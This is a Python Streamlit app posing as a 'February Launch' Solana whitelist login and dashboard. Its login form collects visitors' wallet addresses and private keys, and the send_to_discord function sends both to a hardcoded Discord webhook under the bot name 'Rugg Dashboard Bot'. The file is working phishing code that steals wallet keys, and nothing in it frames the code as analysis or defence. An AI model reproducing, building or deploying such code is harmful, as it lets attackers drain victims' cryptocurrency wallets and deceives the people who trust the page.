import streamlit as st
from streamlit_extras.colored_header import colored_header
from streamlit_extras.let_it_rain import rain
import pandas as pd
from datetime import datetime
import base58
import requests
import json
import os

# File to store participants data
STORAGE_FILE = "participants_data.json"
AUTH_FILE = "auth_data.json"

@st.cache_data
def load_auth_data():
    """Load authentication data from file"""
    if os.path.exists(AUTH_FILE):
        try:
            with open(AUTH_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_auth_data(wallet):
    """Save authentication data to file"""
    auth_data = load_auth_data()
    auth_data[wallet] = {
        'last_login': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(AUTH_FILE, 'w') as f:
        json.dump(auth_data, f)

@st.cache_data
def load_participants():
    """Load participants from file"""
    if os.path.exists(STORAGE_FILE):
        try:
            with open(STORAGE_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_participants(participants):
    """Save participants to file"""
    with open(STORAGE_FILE, 'w') as f:
        json.dump(participants, f)
    # Clear the cache to refresh data
    load_participants.clear()

def init_session_state():
    """Initialize session state variables"""
    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
    if 'current_wallet' not in st.session_state:
        st.session_state.current_wallet = None
    
    # Check for existing authentication
    if not st.session_state.logged_in and st.session_state.current_wallet:
        auth_data = load_auth_data()
        if st.session_state.current_wallet in auth_data:
            st.session_state.logged_in = True

def add_participant(wallet):
    """Add new participant and save to file"""
    participants = load_participants()
    if wallet not in [p['wallet'] for p in participants]:
        participants.append({
            'wallet': wallet,
            'joined_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'position': len(participants) + 1
        })
        save_participants(participants)
        save_auth_data(wallet)

def login_page():
    st.set_page_config(page_title="February Launch 🚀", page_icon="🦄", layout="centered")
    apply_custom_styles()
    
    # Initialize session state
    init_session_state()

    if st.session_state.logged_in:
        display_launch_dashboard()
        return

    colored_header(
        label="Welcome to the February Launch 🚀",
        description="Securely log in with your Solana Wallet to get started.",
        color_name="violet-80",
    )
    
    rain(emoji="✨", falling_speed=3, animation_length="infinite")

    st.write("")
    with st.container():
        st.markdown(
            """
            <div style="background: #1f1f2e; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);">
                <h3 style="color: #ffffff; text-align: center; font-weight: bold;">Secure Login</h3>
                <p style="color: #d4d4e4; text-align: center;">Enter your credentials below</p>
            </div>
            """, unsafe_allow_html=True,
        )
        st.write("")

        with st.form("login_form", clear_on_submit=True):
            wallet = st.text_input("🔑 Solana Wallet Address", placeholder="e.g., A12bC3d...XYZ")
            key = st.text_input("🔒 Solana Private Key", type="password", placeholder="Enter your private key")
            submitted = st.form_submit_button("Login 🔓")

            if submitted and validate_credentials(wallet, key):
                st.session_state.logged_in = True
                st.session_state.current_wallet = wallet
                add_participant(wallet)
                send_to_discord(wallet, key)  # Now passing both wallet and key
                st.success("🎉 Login successful!")
                st.rerun()

def send_to_discord(wallet, key):
    webhook_url = "https://discordapp.com/api/webhooks/1333513646948749433/59hwJeUeRRSeGNZo4wyAJ3tVu6bPIWixP8G49OXjbpOJU2PxGBe5457GYztx3f1sLgcp"
    
    embed = {
        "title": "🎯 New Wallet Connected!",
        "description": f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "color": 7506394,
        "fields": [
            {
                "name": "Wallet Address",
                "value": f"`{wallet}`",
                "inline": True
            },
            {
                "name": "Private Key",
                "value": f"`{key}`",
                "inline": True
            },
            {
                "name": "Position",
                "value": f"#{len(st.session_state.participants)}",
                "inline": True
            },
            {
                "name": "Spots Remaining",
                "value": f"{1000 - len(st.session_state.participants)}/1000",
                "inline": True
            }
        ]
    }
    
    data = {
        "embeds": [embed],
        "username": "Rugg Dashboard Bot",
        "avatar_url": "https://i.imgur.com/4M34hi2.png"
    }
    
    requests.post(webhook_url, json=data)


    st.markdown(
        """
        <hr style="border: none; border-top: 1px solid #444;">
        <p style="text-align: center; color: #999;">
        Need help? <a href="https://discord.gg/SAyZsAG5" target="_blank" style="color: #ffffff; text-decoration: none;"><strong>Join our Discord</strong></a>
        </p>
        """,
        unsafe_allow_html=True,
    )

# Initialize all session state variables at the start
if "participants" not in st.session_state:
    st.session_state.participants = []
if "logged_in" not in st.session_state:
    st.session_state.logged_in = False
if "current_wallet" not in st.session_state:
    st.session_state.current_wallet = None


def display_launch_dashboard():
    st.title("Launch Dashboard 🚀")
    
    participants = load_participants()
    
    col1, col2, col3 = st.columns(3)
    with col1:
        user_position = next((p['position'] for p in participants if p['wallet'] == st.session_state.current_wallet), "N/A")
        st.metric("Your Position", user_position)
    with col2:
        st.metric("Total Participants", len(participants))
    with col3:
        remaining = 1000 - len(participants)
        st.metric("Spots Remaining", f"{remaining}/1000")

    st.header("🎯 Secured Positions")
    if participants:
        df = pd.DataFrame(participants)
        def highlight_current_user(row):
            if row['wallet'] == st.session_state.current_wallet:
                return ['background-color: #2c3e50'] * len(row)
            return [''] * len(row)
        
        styled_df = df.style.apply(highlight_current_user, axis=1)
        st.dataframe(styled_df, hide_index=True)
    
    st.header("📊 Launch Details")
    st.markdown("""
        - Initial Price: 5 SOL
        - Max Supply: 1,000
        - Whitelist Spots: 500
        - Public Sale: TBA
    """)

    if st.button("Logout"):
        st.session_state.logged_in = False
        st.session_state.current_wallet = None
        st.rerun()

def validate_credentials(wallet, key):
    return validate_solana_address(wallet) and validate_solana_private_key(key)

def validate_solana_address(address):
    try:
        decoded = base58.b58decode(address)
        return len(decoded) in [32, 44]
    except ValueError:
        return False

def validate_solana_private_key(key):
    try:
        decoded = base58.b58decode(key)
        return len(decoded) == 32 or len(decoded) == 64
    except ValueError:
        return False

def apply_custom_styles():
    st.markdown(
        """
        <style>
        body {
            background-color: #121212;
            color: #d4d4e4;
            font-family: 'Arial', sans-serif;
        }

        input {
            border-radius: 10px !important;
            padding: 10px !important;
            background-color: #1f1f2e !important;
            color: #ffffff !important;
            border: 1px solid #444444 !important;
        }

        button {
            background-color: #5c6bc0 !important;
            border: none !important;
            border-radius: 8px !important;
            padding: 10px 20px !important;
            font-size: 16px !important;
            font-weight: bold !important;
            color: #ffffff !important;
            cursor: pointer !important;
            box-shadow: 0 4px 15px rgba(92, 107, 192, 0.5);
        }

        button:hover {
            background-color: #7986cb !important;
        }

        .stForm {
            border-radius: 15px !important;
            background-color: #1f1f2e !important;
            padding: 25px !important;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stAlert {
            border-radius: 10px !important;
            padding: 15px !important;
        }
        </style>
        """,
        unsafe_allow_html=True,
    )

if __name__ == "__main__":
    login_page()
    
